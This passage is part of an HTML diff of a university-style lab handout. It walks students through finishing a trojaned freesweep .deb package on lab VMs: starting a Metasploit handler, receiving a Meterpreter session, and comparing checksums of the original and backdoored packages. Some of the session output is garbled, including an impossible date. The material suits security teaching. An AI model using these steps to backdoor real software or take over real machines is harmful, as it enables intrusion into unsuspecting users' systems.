+        <table border="0" style="border-collapse: collapse; width: 85%; background-color: #000000; font-family: 'courier new', courier, monospace; border-style: none; border-radius: 5px; box-shadow: 5px 5px 1px 0px rgba(50, 50, 50, 0.75); overflow: hidden;">
+          <tbody>
+            <tr style="background-color: #ced4e9;">
+              <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #f44336; font-size: 12pt;">&#11044;</span></td>
+              <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #ffee58; font-size: 12pt;">&#11044;</span></td>
+              <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #66bb6a; font-size: 12pt;">&#11044;</span></td>
+              <td style="width: 94%; text-align: center;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 14pt;"><strong>CODE</strong></span></td>
+            </tr>
+            <tr>
+              <td colspan="4" style="width: 99%;">
+                <p style="margin: 0; padding: 0;">
+                  <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #2dc26b;">&nbsp;&nbsp;# Run in Background</span></strong><br />
+                  <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;msf6> <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">exploit</span> -j</span>
+                  </p>
+              </td>
+            </tr>
+          </tbody>
+        </table>
+        <p></p>
+      </li>
+    </ol>
+  </li>
+</ol>
+
+<!-- 4.4 -->
+<ol style="font-family: arial, helvetica, sans-serif; font-size: 12pt;" start="4">
+  <li><p><span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">On your <strong><em>Kali Linux VM</em></strong>, you should see a notice that a new session was opened.</span></p>
+    <!-- CODE -->
+    <table border="0" style="border-collapse: collapse; width: 85%; background-color: #000000; font-family: 'courier new', courier, monospace; border-style: none; border-radius: 5px; box-shadow: 5px 5px 1px 0px rgba(50, 50, 50, 0.75); overflow: hidden;">
+      <tbody>
+        <tr style="background-color: #ced4e9;">
+          <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #f44336; font-size: 12pt;">&#11044;</span></td>
+          <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #ffee58; font-size: 12pt;">&#11044;</span></td>
+          <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #66bb6a; font-size: 12pt;">&#11044;</span></td>
+          <td style="width: 94%; text-align: center;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 14pt;"><strong>CODE</strong></span></td>
+        </tr>
+        <tr>
+          <td colspan="4" style="width: 99%;">
+            <p style="margin: 0; padding: 0;">
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #2dc26b;">&nbsp;&nbsp;# Session Opened</span></strong><br />
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;[*] Meterpreter session 1 opened (192.168.1.2:4575 -> 192.168.1.4:36473) at 2023-12-77 19:53:42 -0500$ <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">chmod</span> +x freesweep_scores</span><br />
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;msf6> <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">sessions</span> --list</span><br />
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;msf6> <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">sessions</span> -i <em>x</em></span></strong><br /><br />
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #2dc26b;">&nbsp;&nbsp;# Where <em>x</em> = num of your original exploit<br /></span></strong>
+            </p>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+    <p></p>
+  </li>
+</ol>
+
+<!-- 4.5 -->
+<ol style="font-family: arial, helvetica, sans-serif; font-size: 12pt;" start="5">
+  <li>
+    <p><span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">You can verify that your copy of <span style="font-family: 'courier new', courier, monospace; background-color: #ecdbdb; color: #ba372a;"><strong>freesweep.deb</strong></span> contains your backdoor program with <span style="font-family: 'courier new', courier, monospace; background-color: #ecdbdb; color: #ba372a;"><strong>dpkg -c freesweep.deb</strong></span></span></p>
+
+    <!-- 4.5 DELIVERABLE -->
+    <table border="0" style="border-collapse: collapse; width: 85%; background-color: #ced4d9; border-style: none; border-radius: 5px; box-shadow: 5px 5px 1px 0px rgba(50, 50, 50, 0.75); overflow: hidden;">
+      <tbody>
+        <tr>
+          <td style="width: 2%; background-color: #000000;">&nbsp;</td>
+          <td colspan="5" style="width: 98%; text-align: left; vertical-align: top;">
+            <p style="margin: 0; padding: 0;">
+              <img src="https://web.acd.ccac.edu/~mkisow/assets/black-deliverable-24x24.svg"  style="border: 0px solid #000000;" height="24" width="24" alt="deliverable"/>
+              <strong><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 14pt;">DELIVERABLE</span></strong>
+            </p>
+          </td>
+        </tr>
+        <tr>
+          <td style="width: 2%; background-color: #000000;">&nbsp;</td>
+          <td style="width: 5%; text-align: right; vertical-align: top;"><strong><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;">4.5</span></strong></td>
+          <td colspan="3" style="width: 93%;"></td>
+        </tr>
+        <tr>
+          <td style="width: 2%; background-color: #000000;">&nbsp;</td>
+          <td colspan="2" style="width: 7%; text-align: right; vertical-align: top;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;"><strong>A.</strong></span></td>
+          <td colspan="2" style="width: 91%;">
+            <p style="margin: 0; padding: 0;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;">Submit a screenshot of Metasploitable2 showing the game running.</span></p>
+          </td>
+        </tr>
+        <tr>
+          <td style="width: 2%; background-color: #000000;">&nbsp;</td>
+          <td colspan="2" style="width: 7%; text-align: right; vertical-align: top;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;"><strong>B.</strong></span></td>
+          <td colspan="2" style="width: 91%;">
+            <p style="margin: 0; padding: 0;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;">Submit a screenshot of Kali showing the active <em>meterpreter</em> session.</span></p>
+          </td>
+        </tr>
+        <tr>
+          <td style="width: 2%; background-color: #000000;">&nbsp;</td>
+          <td colspan="2" style="width: 7%; text-align: right; vertical-align: top;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;"><strong>C.</strong></span></td>
+          <td colspan="2" style="width: 91%;">
+            <p style="margin: 0; padding: 0;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;">What is the md5 checksum of the original freesweep <span style="font-family: 'courier new', courier, monospace; background-color: #ecdbdb; color: #ba372a;"><strong>.deb</strong></span> file downloaded from the repository? Use the <span style="font-family: 'courier new', courier, monospace; background-color: #ecdbdb; color: #ba372a;"><strong>md5sum</strong></span> command.</span></p>
+          </td>
+        </tr>
+        <tr>
+          <td style="width: 2%; background-color: #000000;">&nbsp;</td>
+          <td colspan="2" style="width: 7%; text-align: right; vertical-align: top;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;"><strong>C.</strong></span></td>
+          <td colspan="2" style="width: 91%;">
+            <p style="margin: 0; padding: 0;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;">What is the md5 checksum of the <em>modified</em>> freesweep <span style="font-family: 'courier new', courier, monospace; background-color: #ecdbdb; color: #ba372a;"><strong>.deb</strong></span> file that also includes the backdoor program "freesweep_scores"? Use the <span style="font-family: 'courier new', courier, monospace; background-color: #ecdbdb; color: #ba372a;"><strong>md5sum</strong></span> command.</span></p>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+    <p></p>
+  </li>
+</ol>
+
+<!-- 4.6 -->
+<ol style="font-family: arial, helvetica, sans-serif; font-size: 12pt;" start="6">
+  <li>
+    <p><span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">On your <strong><em>Kali Linux VM</em></strong> exit the Metasploit shell</span>.</p>
+
+    <!-- CODE -->
+    <table border="0" style="border-collapse: collapse; width: 85%; background-color: #000000; font-family: 'courier new', courier, monospace; border-style: none; border-radius: 5px; box-shadow: 5px 5px 1px 0px rgba(50, 50, 50, 0.75); overflow: hidden;">
+      <tbody>
+        <tr style="background-color: #ced4e9;">
+          <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #f44336; font-size: 12pt;">&#11044;</span></td>
+          <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #ffee58; font-size: 12pt;">&#11044;</span></td>
+          <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #66bb6a; font-size: 12pt;">&#11044;</span></td>
+          <td style="width: 94%; text-align: center;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 14pt;"><strong>CODE</strong></span></td>
+        </tr>
+        <tr>
+          <td colspan="4" style="width: 99%;">
+            <p style="margin: 0; padding: 0;">
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #2dc26b;">&nbsp;&nbsp;# Exit Shells<br /></span></strong>
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;msf6> <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">quit</span></span></strong>
+            </p>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+    <p></p>
+  </li>
+</ol>
+
+<!-- REFERENCES -->
+<blockquote>
+  <p><span style="font-family: arial, helvetica, sans-serif; font-size: 12pt; text-decoration: underline;"><strong>REFERENCES</strong></span></p>
+  <ul>
+    <li><span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;"><a href="https://www.offensive-security.com/metasploit-unleashed/binary-linux-trojan/" target="_blank" rel="noopener"><span style="color: #ba372a;">Creating a binary Linux Trojan</span></a></span></li>
+  </ul>
+</blockquote>
+<p></p>
+
+<!-- COPYRIGHT -->
+<!-- <a href="##top8" style="color: #ba372a;">[TOP]</a> -->
+<hr />
+<p style="font-family: arial, helvetica, sans-serif; font-size: 12pt; text-align: center; color: #000000;">Copyright &copy; 2022-2024 Dr. Matthew Kisow. All Rights Reserved</p>
